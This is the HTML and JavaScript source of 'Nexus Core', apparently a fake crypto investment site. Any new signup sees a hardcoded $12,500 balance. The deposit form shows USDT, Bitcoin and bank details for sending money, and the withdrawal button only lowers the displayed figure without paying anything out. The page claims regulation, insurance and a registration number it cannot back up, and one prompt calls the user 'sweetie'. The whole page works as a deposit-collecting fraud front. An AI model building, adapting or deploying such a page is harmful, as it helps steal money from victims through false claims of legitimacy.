<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS CORE | Institutional Digital Assets</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <style>
        :root { --gold: #f3ba2f; --bg: #030508; --card: #0d1117; }
        body { background-color: var(--bg); color: #ffffff; font-family: 'Inter', sans-serif; }
        .glass-panel { background: rgba(13, 17, 23, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.05); }
        .gold-border { border: 1px solid var(--gold) !important; }
        .hidden-section { display: none; }
        .footer-link { color: #6b7280; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
        .footer-link:hover { color: var(--gold); }
        input, select, textarea { background: #161a1e !important; border: 1px solid #2b3139 !important; color: white !important; border-radius: 12px !important; }
        .node-active { height: 8px; width: 8px; background: #10b981; border-radius: 50%; display: inline-block; box-shadow: 0 0 10px #10b981; }
    </style>
</head>
<body class="overflow-x-hidden">

    <nav class="glass-panel sticky top-0 z-[100] px-8 py-4 flex items-center justify-between border-b border-gray-800">
        <div class="flex items-center gap-2 cursor-pointer" onclick="location.reload()">
            <div class="w-10 h-10 bg-[#f3ba2f] rounded-xl flex items-center justify-center font-black text-black text-xl shadow-lg shadow-yellow-500/20">N</div>
            <span class="text-xl font-black italic tracking-tighter uppercase">Nexus<span class="text-[#f3ba2f]">Core</span></span>
        </div>
        <div id="auth-header" class="flex gap-4">
            <button onclick="showSection('signup')" class="bg-[#f3ba2f] text-black px-6 py-2 rounded-full font-black text-xs hover:scale-105 transition shadow-lg shadow-yellow-500/10">ACCESS TERMINAL</button>
        </div>
        <div id="user-header" class="hidden flex items-center gap-4">
            <div class="text-right"><p id="user-name-display" class="text-sm font-bold text-[#f3ba2f] uppercase italic"></p><p class="text-[9px] text-gray-500 font-bold">LEVEL 4 VERIFIED</p></div>
            <button onclick="showSection('dashboard')" class="w-10 h-10 rounded-full border border-gray-700 bg-gray-900 flex items-center justify-center">⚙️</button>
        </div>
    </nav>

    <section id="landing-section" class="section py-32 px-6 text-center animate__animated animate__fadeIn">
        <div class="inline-flex items-center gap-3 bg-white/5 border border-white/10 px-4 py-1 rounded-full mb-8">
            <span class="node-active"></span> <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Global Network Online: 21 Nodes Active</span>
        </div>
        <h1 class="text-6xl md:text-9xl font-black mb-8 italic leading-none tracking-tighter">FUTURE <span class="text-[#f3ba2f]">WEALTH</span><br>DEFINED.</h1>
        <p class="text-gray-500 max-w-2xl mx-auto mb-10 text-lg font-medium">Experience high-frequency investment strategies with institutional grade security.</p>
        <button onclick="showSection('signup')" class="bg-white text-black px-12 py-5 rounded-2xl font-black text-xl hover:bg-[#f3ba2f] transition shadow-2xl">INITIATE CONNECTION</button>
    </section>

    <section id="signup-section" class="section hidden-section flex justify-center py-20 px-6 animate__animated animate__zoomIn">
        <div class="glass-panel p-10 rounded-[40px] w-full max-w-md gold-border">
            <h2 class="text-3xl font-black mb-6 italic text-center">CREATE PORTFOLIO</h2>
            <div class="space-y-4">
                <input id="reg-name" type="text" placeholder="Legal Full Name" class="w-full p-4">
                <input type="email" placeholder="Email Address" class="w-full p-4">
                <input type="password" placeholder="Secure Password" class="w-full p-4">
                <button onclick="handleAuth()" class="w-full bg-[#f3ba2f] text-black font-black py-4 rounded-xl shadow-xl shadow-yellow-500/20">AUTHORIZE ACCESS</button>
            </div>
        </div>
    </section>

    <section id="dashboard-section" class="section hidden-section container mx-auto px-6 py-10 animate__animated animate__fadeIn">
        
        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6 mb-10">
            <div class="glass-panel p-8 rounded-[32px] gold-border col-span-1 lg:col-span-2">
                <p class="text-[10px] font-bold text-gray-500 uppercase tracking-widest mb-2">Total Asset Valuation</p>
                <h2 id="balance-val" class="text-5xl font-black italic tracking-tighter">$12,500.00</h2>
                <div class="flex gap-4 mt-8">
                    <button onclick="openModal('deposit')" class="flex-1 bg-green-600 text-white py-3 rounded-xl font-black text-[10px] uppercase">Add Liquidity</button>
                    <button onclick="openModal('withdraw')" class="flex-1 bg-white/5 border border-white/10 py-3 rounded-xl font-black text-[10px] uppercase">Extract Funds</button>
                </div>
            </div>
            <div class="glass-panel p-8 rounded-[32px] flex flex-col justify-center">
                <p class="text-[10px] font-bold text-gray-500 uppercase mb-2">Node Efficiency</p>
                <h3 class="text-3xl font-black text-green-500">99.98%</h3>
                <p class="text-[10px] text-gray-600 mt-1 italic">Real-time sync active</p>
            </div>
            <div class="glass-panel p-8 rounded-[32px] flex flex-col justify-center">
                <p class="text-[10px] font-bold text-gray-500 uppercase mb-2">Global Rank</p>
                <h3 class="text-3xl font-black text-[#f3ba2f]">#4,102</h3>
                <p class="text-[10px] text-gray-600 mt-1 italic">Top 5% of Investors</p>
            </div>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div class="lg:col-span-2 glass-panel rounded-[32px] overflow-hidden">
                <div class="p-6 border-b border-gray-800 bg-white/5 font-black text-[10px] tracking-widest flex justify-between">
                    <span>GLOBAL SERVER NODES</span>
                    <span class="text-[#f3ba2f]">2026 STATUS: OPTIMIZED</span>
                </div>
                <div class="p-8 grid grid-cols-2 md:grid-cols-4 gap-4">
                    <div class="p-4 bg-black/40 border border-gray-800 rounded-2xl text-center">
                        <span class="node-active mb-2"></span>
                        <p class="text-[9px] font-bold text-gray-500">Node: HKG-1</p>
                    </div>
                    <div class="p-4 bg-black/40 border border-gray-800 rounded-2xl text-center">
                        <span class="node-active mb-2"></span>
                        <p class="text-[9px] font-bold text-gray-500">Node: NYC-4</p>
                    </div>
                    <div class="p-4 bg-black/40 border border-gray-800 rounded-2xl text-center">
                        <span class="node-active mb-2"></span>
                        <p class="text-[9px] font-bold text-gray-500">Node: LON-2</p>
                    </div>
                    <div class="p-4 bg-black/40 border border-gray-800 rounded-2xl text-center">
                        <span class="node-active mb-2" style="background: #f59e0b; box-shadow: 0 0 10px #f59e0b;"></span>
                        <p class="text-[9px] font-bold text-gray-500">Node: DXB-7</p>
                    </div>
                </div>
            </div>
            
            <div class="glass-panel p-8 rounded-[32px]">
                <h4 class="font-black text-xs uppercase mb-6 tracking-widest text-[#f3ba2f]">Corporate Identity</h4>
                <div class="space-y-4 text-[11px] text-gray-400 leading-relaxed">
                    <p><strong>REG No:</strong> NX-2026-99102-G</p>
                    <p><strong>Status:</strong> Fully Insured by Global Trust</p>
                    <p><strong>Location:</strong> Nexus Tower, Financial District, DXB</p>
                    <hr class="border-gray-800">
                    <p class="italic italic">"Building the foundation of the 2026 digital economy through secure liquidity."</p>
                </div>
            </div>
        </div>
    </section>

    <div id="deposit-modal" class="fixed inset-0 z-[200] bg-black/95 backdrop-blur-xl hidden flex items-center justify-center p-6">
        <div class="glass-panel w-full max-w-md rounded-[40px] p-10 animate__animated animate__fadeInDown gold-border">
            <div class="flex justify-between items-center mb-8">
                <h3 class="text-2xl font-black italic uppercase">Add Liquidity</h3>
                <button onclick="closeModals()" class="text-gray-500 text-3xl">&times;</button>
            </div>
            
            <div class="space-y-6">
                <div><label class="text-[10px] font-bold text-gray-500 uppercase">1. Choose Gateway</label>
                    <select id="dep-method" onchange="updateDepositDetails()" class="w-full p-4 mt-2 text-xs">
                        <option value="USDT">USDT (TRC20) - Fast</option>
                        <option value="BTC">Bitcoin (Network)</option>
                        <option value="BANK">Local Bank (P2P)</option>
                    </select>
                </div>
                
                <div id="dep-details-box" class="bg-yellow-500/10 p-4 rounded-2xl border border-yellow-500/20">
                    <p class="text-[9px] font-bold text-yellow-500 uppercase mb-2">Company Receiving Detail:</p>
                    <p id="dep-address" class="text-xs font-mono break-all font-bold tracking-tighter">TLy2n1R7xP9qW23mXyZ99Vv2N8pQxR2</p>
                    <p class="text-[8px] text-gray-500 mt-2 italic">Copy this address and send exact amount.</p>
                </div>

                <div><label class="text-[10px] font-bold text-gray-500 uppercase">2. Proof of Transfer</label>
                    <input id="dep-amount" type="number" placeholder="Amount USD" class="w-full p-4 mt-2 text-sm font-black">
                    <input id="dep-tid" type="text" placeholder="Transaction Hash / TID" class="w-full p-4 mt-2 text-xs font-mono">
                    <div class="mt-2">
                        <input type="file" id="dep-proof" class="w-full text-[10px] text-gray-500">
                    </div>
                </div>

                <button onclick="submitDeposit()" class="w-full bg-[#f3ba2f] text-black font-black py-4 rounded-xl shadow-xl">SUBMIT TO VALIDATOR</button>
            </div>
        </div>
    </div>

    <div id="withdraw-modal" class="fixed inset-0 z-[200] bg-black/95 backdrop-blur-xl hidden flex items-center justify-center p-6">
        <div class="glass-panel w-full max-w-md rounded-[40px] p-10 animate__animated animate__fadeInUp">
            <div class="flex justify-between items-center mb-8">
                <h3 class="text-2xl font-black italic uppercase text-red-500">Extract Funds</h3>
                <button onclick="closeModals()" class="text-gray-500 text-3xl">&times;</button>
            </div>
            <div class="space-y-4">
                <input id="wit-name" type="text" placeholder="Account Title" class="w-full p-4 text-sm font-bold">
                <input id="wit-acc" type="text" placeholder="Account / Wallet Number" class="w-full p-4 text-xs font-mono">
                <input id="wit-amt" type="number" placeholder="Withdrawal Amount (USD)" class="w-full p-4 text-xl font-black">
                <p class="text-[9px] text-gray-600 italic">Processing Time: 12-24 Institutional Hours</p>
                <button onclick="submitWithdraw()" class="w-full bg-white text-black font-black py-4 rounded-xl shadow-xl">REQUEST SETTLEMENT</button>
            </div>
        </div>
    </div>

    <div id="legal-modal" class="fixed inset-0 z-[300] bg-black/98 hidden overflow-y-auto p-10">
        <div class="max-w-3xl mx-auto py-10">
            <button onclick="closeModals()" class="text-[#f3ba2f] font-black mb-10 text-sm">← CLOSE LEGAL DOCUMENT</button>
            <div id="legal-content" class="space-y-8 text-gray-400 text-sm leading-relaxed">
                </div>
        </div>
    </div>

    <footer class="container mx-auto px-10 py-20 border-t border-gray-900 mt-20">
        <div class="grid grid-cols-1 md:grid-cols-3 gap-10">
            <div>
                <div class="flex items-center gap-2 mb-4">
                    <div class="w-6 h-6 bg-[#f3ba2f] rounded flex items-center justify-center text-black font-black text-xs">N</div>
                    <span class="font-black italic text-sm tracking-tighter">NEXUS CORE</span>
                </div>
                <p class="text-gray-600 text-[10px] leading-relaxed">Authorized and regulated digital asset custodian 2026. All rights reserved by Nexus Global Holding.</p>
            </div>
            <div class="flex flex-col gap-2">
                <button onclick="showLegal('privacy')" class="footer-link text-left">Privacy Protocol</button>
                <button onclick="showLegal('terms')" class="footer-link text-left">Terms of Service</button>
                <button onclick="showLegal('risk')" class="footer-link text-left">Risk Disclosure</button>
            </div>
            <div class="text-right">
                <p class="text-gray-600 text-[10px]">SECURED BY</p>
                <h4 class="text-gray-400 font-black text-xs">QUANTUM-GUARD 2026</h4>
            </div>
        </div>
    </footer>

    <script>
        let balance = 12500.00;

        function showSection(id) {
            document.querySelectorAll('.section').forEach(s => s.classList.add('hidden-section'));
            document.getElementById(id + '-section').classList.remove('hidden-section');
            window.scrollTo(0,0);
        }

        function handleAuth() {
            const name = document.getElementById('reg-name').value || "Nexus Member";
            document.getElementById('auth-header').classList.add('hidden');
            document.getElementById('user-header').classList.remove('hidden');
            document.getElementById('user-name-display').innerText = name;
            showSection('dashboard');
        }

        function openModal(type) { document.getElementById(type + '-modal').classList.remove('hidden'); }
        function closeModals() { 
            document.getElementById('deposit-modal').classList.add('hidden'); 
            document.getElementById('withdraw-modal').classList.add('hidden'); 
            document.getElementById('legal-modal').classList.add('hidden'); 
        }

        function updateDepositDetails() {
            const method = document.getElementById('dep-method').value;
            const addr = document.getElementById('dep-address');
            if(method === 'USDT') addr.innerText = "TLy2n1R7xP9qW23mXyZ99Vv2N8pQxR2";
            if(method === 'BTC') addr.innerText = "bc1qxy2kgdy6jrsqtzq2n0yrf2493p83kkfJH782X";
            if(method === 'BANK') addr.innerText = "Nexus Global Bank | A/C: 1009928177 | SWIFT: NEXUSG21";
        }

        function submitDeposit() {
            const amt = document.getElementById('dep-amount').value;
            const tid = document.getElementById('dep-tid').value;
            if(!amt || !tid) return alert("Please fill all security fields, sweetie!");
            alert("Verification In Progress: Your transaction has been broadcasted to the Nexus Network for validation.");
            closeModals();
        }

        function submitWithdraw() {
            const amt = parseFloat(document.getElementById('wit-amt').value);
            if(!amt || amt > balance) return alert("Invalid amount or insufficient liquidity!");
            balance -= amt;
            document.getElementById('balance-val').innerText = '$' + balance.toLocaleString();
            alert("Withdrawal Initialized: Funds will be released after blockchain confirmation.");
            closeModals();
        }

        function showLegal(type) {
            const content = document.getElementById('legal-content');
            document.getElementById('legal-modal').classList.remove('hidden');
            if(type === 'privacy') {
                content.innerHTML = `<h2 class="text-3xl font-black text-white">Privacy Protocol</h2><p>Nexus Core uses End-to-End Encryption (E2EE) for all personal data. Your financial records are stored in decentralized vaults...</p><p>We do not share data with third-party brokers without institutional authorization...</p>`;
            } else {
                content.innerHTML = `<h2 class="text-3xl font-black text-white">Terms of Asset Management</h2><p>By using the terminal, you acknowledge that digital assets carry volatility risk...</p><p>Withdrawals are subject to 24-hour liquidity verification cycles...</p>`;
            }
        }
    </script>
</body>
</html>
